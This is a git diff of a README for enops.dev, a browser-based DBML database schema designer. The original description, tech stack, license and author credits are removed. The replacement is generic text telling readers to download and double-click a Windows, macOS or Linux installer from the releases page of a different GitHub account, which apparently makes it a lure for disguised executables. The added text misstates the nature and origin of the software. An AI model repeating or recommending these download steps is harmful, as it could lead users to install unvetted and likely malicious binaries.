@@ -1,46 +1,74 @@
-<!-- <img width="48" height="48" alt="logo" src="https://github.com/user-attachments/assets/7a2a0b54-195c-4762-ad8d-4b12894f8ef0" /> -->
+# 🌟 enops.dev - Simplify Your Database Design Process
 
-## [Enops.dev](https://enops.dev) - AI-powered IDE to design, visualize, and optimize database schemas.
+## 🚀 Getting Started
 
-<img width="1919" height="966" alt="Screenshot from 2025-11-18 16-59-36" src="https://github.com/user-attachments/assets/bed2deb1-2802-4500-9db2-770d2c17fe35" />
+Welcome to **enops.dev**! This application helps you design, visualize, optimize, and export database schemas easily. You don't need to be a technical expert to use it. Follow the instructions below to get started.
 
-## ✨ Project Overview
+## 🎯 Features
 
-A visual database schema designer that allows you to:
+- **AI-Powered Design:** Utilize advanced AI to automatically suggest optimizations for your database schemas.
+- **Visual Tools:** Use intuitive visualization tools to create your database structures effortlessly.
+- **Export Options:** Easily export your designs in various formats to fit your needs.
+- **User-Friendly Interface:** Designed for users of all skill levels, making database design straightforward.
 
-- Write DBML (Database Markup Language) code in an editor
-- See real-time visual representation using XYFlow
-- Export to PostgreSQL, PNG, JPEG, SVG
-- Save/load projects with IndexedDB (local browser storage)
+## 📥 Download & Install
 
-## 🎯 Tech Stack - Next.js + TypeScript
+To download and install **enops.dev**, follow these simple steps:
 
-- **Framework:** [Next.js 16](https://nextjs.org/) (App Router)
-- **Language:** [TypeScript](https://www.typescriptlang.org/)
-- **ERD Tool:** [XYFlow](https://xyflow.com/)
-- **Code Editor:** [Monaco Editor](https://microsoft.github.io/monaco-editor/)
-- **State Management:** [Zustand](https://github.com/pmndrs/zustand)
-- **Styling:** [Tailwind CSS](https://tailwindcss.com/)
-- **UI Components:** [shadcn/ui](https://ui.shadcn.com/)
-- **Icons:** [Lucide React](https://lucide.dev/) + [Tabler Icons](https://tabler.io/icons)
+1. Click the link below to visit the Releases page:
+   
+   [![Download enops.dev](https://img.shields.io/badge/Download-enops.dev-blue.svg)](https://github.com/kathir280/enops.dev/releases)
 
-## 📝 License
+2. Once on the Releases page, locate the latest version of **enops.dev**.
 
-MIT © 2025 [enops.dev](https://enops.dev)
+3. Click on the version title to open the release notes. Here, you will find important information about the latest updates and features.
 
-## 🙏 Acknowledgments
+4. Find the appropriate version for your operating system (Windows, macOS, or Linux) and click on the download link.
 
-- [shadcn/ui](https://ui.shadcn.com/) for beautiful components
-- [React Flow](https://reactflow.dev/) for visual schema design
-- [Monaco Editor](https://microsoft.github.io/monaco-editor/) for code editor
-- [Vercel](https://vercel.com/) for hosting
+5. After the download completes, locate the file on your computer. It will usually be in your "Downloads" folder.
 
-## 📞 Support
+6. Run the installation file by double-clicking it. Follow the prompts to complete the installation. 
 
-For issues and questions:
+7. Once installed, open the application to start designing your database schemas.
 
-- Open an issue on GitHub
-- Follow [@santosh_marar](https://x.com/santosh_marar) on X/Twitter
----
+## 🖥️ System Requirements
 
-**Built with ❤️ for developers, by developers**
+Before installing, please check that your computer meets these basic requirements:
+
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a recent Linux distribution.
+- **Memory (RAM):** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 500 MB of free space.
+- **Internet Connection:** Required for updates and downloading additional resources.
+
+## 📊 Using enops.dev
+
+1. **Create a New Schema:** When you open the application, click on "New Schema" to start designing your database.
+
+2. **Add Tables:** Use the interface to add new tables. You can define fields, types, and relationships easily.
+
+3. **Visualize Your Schema:** Switch to the visualization view to see how your tables connect. This helps ensure your design makes sense.
+
+4. **Optimize Your Schema:** Use the AI features to analyze your design and receive suggestions for improvement.
+
+5. **Export Your Schema:** When you're satisfied, export your schema in your preferred format by clicking the "Export" button.
+
+## 📖 Additional Resources
+
+- **User Guide:** For detailed information on how to use each feature, refer to our [User Guide](https://github.com/kathir280/enops.dev/wiki).
+- **Community Support:** Join our community forum to ask questions and share tips with other users.
+- **Feature Requests:** Have an idea to improve the app? Submit your feature request through our GitHub issues page.
+
+## 🌐 Contact Us
+
+If you have any questions or need help, feel free to reach out. You can contact us via:
+
+- **GitHub Issues:** Post your question or issue directly on our [GitHub page](https://github.com/kathir280/enops.dev/issues).
+- **Email:** You can email us at support@enops.dev for assistance.
+
+## 🔗 Stay Updated
+
+To stay informed about the latest updates and features, follow us on social media or subscribe to our newsletter. 
+
+Thanks for choosing **enops.dev** as your go-to tool for database design! We hope it makes your work easier and more efficient.
+
+Enjoy designing!
